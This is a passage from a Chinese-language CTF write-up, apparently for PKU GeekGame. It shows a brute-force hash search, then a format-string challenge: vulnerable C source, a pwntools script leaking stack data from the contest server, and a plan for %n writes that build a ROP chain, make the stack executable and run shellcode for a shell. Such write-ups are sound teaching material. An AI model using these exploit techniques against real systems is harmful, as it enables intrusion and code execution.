</span></span><span class="line"><span class="cl">            <span class="n">f_hash</span> <span class="o">=</span> <span class="n">update_hash</span><span class="p">(</span><span class="n">f_hash</span><span class="p">,</span> <span class="mi">22</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s1">&#39;I&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">f_hash</span> <span class="o">=</span> <span class="n">update_hash</span><span class="p">(</span><span class="n">f_hash</span><span class="p">,</span> <span class="mi">33</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s1">&#39;O&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">f_hash</span> <span class="o">=</span> <span class="n">update_hash</span><span class="p">(</span><span class="n">f_hash</span><span class="p">,</span> <span class="mi">44</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s1">&#39;U&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">f_hash</span> <span class="o">=</span> <span class="n">update_hash</span><span class="p">(</span><span class="n">f_hash</span><span class="p">,</span> <span class="mi">55</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;无效字符&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f_hash</span> <span class="o">=</span> <span class="n">update_hash</span><span class="p">(</span><span class="n">f_hash</span><span class="p">,</span> <span class="mi">66</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">f_hash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">target_hash</span> <span class="o">=</span> <span class="mi">7748521</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">aTarget</span> <span class="o">=</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl"><span class="n">eTarget</span> <span class="o">=</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">iTarget</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">oTarget</span> <span class="o">=</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">charToCount</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;A&#39;</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;E&#39;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;I&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;O&#39;</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dfs</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="n">charToCount</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="o">==</span> <span class="mi">16</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hash</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="o">==</span> <span class="n">target_hash</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">ic</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span><span class="p">,</span> <span class="n">count</span> <span class="ow">in</span> <span class="n">charToCount</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">charToCount</span><span class="p">[</span><span class="n">char</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="n">dfs</span><span class="p">(</span><span class="n">string</span> <span class="o">+</span> <span class="n">char</span><span class="p">,</span> <span class="n">charToCount</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">charToCount</span><span class="p">[</span><span class="n">char</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">dfs</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">charToCount</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><br>
<h3 id="14-初学-c-语言">14. 初学 C 语言</h3>
<h4 id="flag-1-2">Flag 1</h4>
<p>代码是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">test</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">secrets</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;a_very_secret_string&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">secreti1</span> <span class="o">=</span> <span class="mi">114514</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">secreti2</span> <span class="o">=</span> <span class="mi">1919810</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">publics</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;a_public_string&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">publici</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">flag1</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;a_flag&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">FILE</span><span class="o">*</span> <span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag_f503be2d&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">flag1</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// get flag2 in another file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Please input your instruction:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1023</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;exit&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">t</span> <span class="o">=</span> <span class="nf">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">publics</span><span class="p">,</span> <span class="n">publici</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">t</span> <span class="o">&gt;</span> <span class="mi">1024</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Too long!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">test</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>flag1</code> 被读到了栈里面，只要在 <code>printf</code> 后输足够多的 <code>%lx</code> 就能泄露数据。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">icecream</span> <span class="kn">import</span> <span class="n">ic</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># sh = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;prob09.geekgame.pku.edu.cn&#39;</span><span class="p">,</span> <span class="mi">10009</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Please input your token: &#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;419:MEUCIAJK6pgIYBAyoFwq0WANA1qSkViRLHOVsB2NajlbxhH9AiEAzmCTUCGKE9DnSt61ANO8cw2GpWE6Zj-1iFuTRm8E4Vg=&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%016lx</span><span class="s1"> &#39;</span> <span class="o">*</span> <span class="mi">30</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 将输出字符串拆分成单词</span>
</span></span><span class="line"><span class="cl"><span class="n">words</span> <span class="o">=</span> <span class="n">output</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="n">words</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 解码每个十六进制字符串并打印结果</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">words</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">decoded</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">word</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="n">decoded</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>获得 <code>flag{re4d_PR1nTf_C0dE_so_e4zY}</code></p>
<h4 id="flag-2-1">Flag 2</h4>
<p>思路是使用格式化字符串漏洞，用 <code>%n</code> 来修改栈内存。</p>
<p><code>checksec</code> 得到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[!] Did not find any GOT entries
</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
</span></span><span class="line"><span class="cl">    RELRO:    Full RELRO
</span></span><span class="line"><span class="cl">    Stack:    Canary found
</span></span><span class="line"><span class="cl">    NX:       NX enabled
</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个程序是静态链接的。</p>
<ul>
<li>RELRO 是针对 GOT 的，这个程序没有 GOT，所以不需要考虑</li>
<li>Stack Canary 是针对栈溢出的，使用格式化字符串可以精确修改，不需要考虑</li>
<li>开启了 NX</li>
<li>开启了 PIE，代码段、数据段都是随机的</li>
</ul>
<h5 id="nx">NX</h5>
<p>对于 NX，在程序中发现了 <code>_dl_make_stack_executable</code>，可以用其将栈变成可执行的</p>
<p>关于 <code>_dl_make_stack_executable</code>，找到了一篇博客 <a href="https://x3h1n.github.io/2019/04/14/pwnable-tw-kidding/">pwnable.tw kidding</a></p>
<p><code>_dl_make_stack_executable</code> 的汇编代码是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Dump of assembler code for function _dl_make_stack_executable:
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabb0 &lt;+0&gt;:     endbr64
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabb4 &lt;+4&gt;:     mov    rsi,QWORD PTR [rip+0x4147d]        # 0x7ffff7ffc038 &lt;_dl_pagesize&gt;
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabbb &lt;+11&gt;:    mov    edx,DWORD PTR [rip+0x4004f]        # 0x7ffff7ffac10 &lt;__stack_prot&gt;
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabc1 &lt;+17&gt;:    push   rbx
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabc2 &lt;+18&gt;:    mov    rbx,rdi
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabc5 &lt;+21&gt;:    mov    rdi,rsi
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabc8 &lt;+24&gt;:    neg    rdi
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabcb &lt;+27&gt;:    and    rdi,QWORD PTR [rbx]
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabce &lt;+30&gt;:    call   0x7ffff7f89b10 &lt;mprotect&gt;
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabd3 &lt;+35&gt;:    test   eax,eax
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabd5 &lt;+37&gt;:    jne    0x7ffff7fbabf0 &lt;_dl_make_stack_executable+64&gt;
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabd7 &lt;+39&gt;:    mov    QWORD PTR [rbx],0x0
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabde &lt;+46&gt;:    pop    rbx
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabdf &lt;+47&gt;:    or     DWORD PTR [rip+0x41442],0x1        # 0x7ffff7ffc028 &lt;_dl_stack_flags&gt;
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabe6 &lt;+54&gt;:    ret
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabe7 &lt;+55&gt;:    nop    WORD PTR [rax+rax*1+0x0]
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabf0 &lt;+64&gt;:    endbr64
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabf4 &lt;+68&gt;:    mov    rax,0xffffffffffffffc0
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabfb &lt;+75&gt;:    pop    rbx
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabfc &lt;+76&gt;:    mov    eax,DWORD PTR fs:[rax]
</span></span><span class="line"><span class="cl">   0x00007ffff7fbabff &lt;+79&gt;:    ret
</span></span></code></pre></td></tr></table>
</div>
</div><p>它调用了 <code>mprotect(-_dl_pagesize &amp; *param_1, _dl_pagesize, __stack_prot)</code></p>
<ul>
<li>第一个参数是要改权限的内存页的起始地址</li>
<li><code>_dl_pagesize</code> 是页的大小 4096</li>
<li><code>__stack_prot</code> 是栈的属性，设为 7，即可读可写可执行</li>
</ul>
<p><code>__stack_prot</code> 不太容易设置，所以改成设置 <code>rsi</code>，直接跳转到 <code>make_stack_executable+17</code>，跳过读取这个变量的过程。</p>
<p>目标是栈处作如下修改：</p>
<ul>
<li>首先让 <code>rdi = stackEndPointer</code>，指向数组中的位置（但是 <code>returnAddress + 18</code> 附近的地址好像会报段错误，所以用了 <code>popRdiRbpRet</code> 的 gadget）</li>
<li>然后 <code>rdx = 7</code></li>
<li>之后设置 <code>rsi = 4096</code></li>
<li>调用 <code>make_stack_executable+17</code></li>
<li>跳转到数组中的 shellcode</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">addressTargetValue</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># rdi -&gt; __libc_stack_end</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span><span class="p">:</span> <span class="n">popRdiRbpRet</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># stackEndPointer</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span> <span class="o">+</span> <span class="mi">8</span><span class="p">:</span> <span class="n">stackEndPointer</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># rdx = 7</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span> <span class="o">+</span> <span class="mi">16</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span> <span class="o">+</span> <span class="mi">24</span><span class="p">:</span> <span class="n">popRdxRet</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span> <span class="o">+</span> <span class="mi">32</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># rsi = _dl_pagesize = 4096</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span> <span class="o">+</span> <span class="mi">40</span><span class="p">:</span> <span class="n">popRsiRet</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span> <span class="o">+</span> <span class="mi">48</span><span class="p">:</span> <span class="mi">4096</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># call make_stack_executable+17</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span> <span class="o">+</span> <span class="mi">56</span><span class="p">:</span> <span class="n">makeStackExecutable</span> <span class="o">+</span> <span class="mi">17</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># returnAddress + 56: putcharAddress,</span>
</span></span><span class="line"><span class="cl">    <span class="n">returnAddress</span> <span class="o">+</span> <span class="mi">64</span><span class="p">:</span> <span class="n">shellCodeAddress</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload 包含了这个格式化字符串，shellcode，以及 <code>libcStackEnd</code> 的地址</p>
<h5 id="pie">PIE</h5>
<p>对于 PIE，用 <code>%lx</code> 泄露栈变量地址，用 <code>%165$lx</code> 泄露返回地址（代码段函数地址），计算本次运行的变量地址</p>
<blockquote>
<p>我是先在本地关闭 ASLR 用 pwndbg 调试，跑通后再改成开启 ASLR 的。</p>
</blockquote>
<p>有概率成功进 shell，进入后 <code>cat flag_ec84a22b</code>，得到 <code>flag{pWn_0n_STACK_tO0_simPle}</code></p>
<details open>
<summary>代码</summary>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span></code></pre></td>
<td class="lntd">
